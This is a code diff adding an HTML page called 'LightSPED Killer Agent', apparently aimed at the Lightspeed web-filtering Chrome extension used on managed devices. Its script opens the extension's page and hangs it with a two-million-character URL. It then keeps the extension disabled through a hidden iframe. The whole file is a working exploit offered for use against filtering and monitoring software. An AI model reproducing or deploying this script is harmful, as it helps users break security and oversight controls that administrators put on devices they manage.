@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>LightSPED Killer Agent</title>
+    <link rel="icon" type="image/png" href="favicon.png">
+    <script>
+        function hanger() {
+            let extURL = "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png";
+            let extWin = window.open(extURL);
+
+            setTimeout(function() {
+                let killURL = "https://" + "e".repeat(2000000); // generates a really long URL that hangs the extension page
+                extWin.location.href = killURL;
+                let iframe = document.createElement("iframe"); // iframe so that the extension wont restore itself when the switch is flipped
+                iframe.src = extURL;
+                iframe.style.width = "10px";
+                iframe.style.height = "10px";
+                iframe.style.border = "none";
+                document.body.appendChild(iframe);
+                setTimeout(function() {
+                    extWin.close();
+                }, 1000);
+            }, 100);
+        }
+    </script>
+</head>
+<body>
+<h2>LightSPED Killer Agent</h2>
+<button onclick="hanger()">Hang extension</button>
+</body>
+</html>
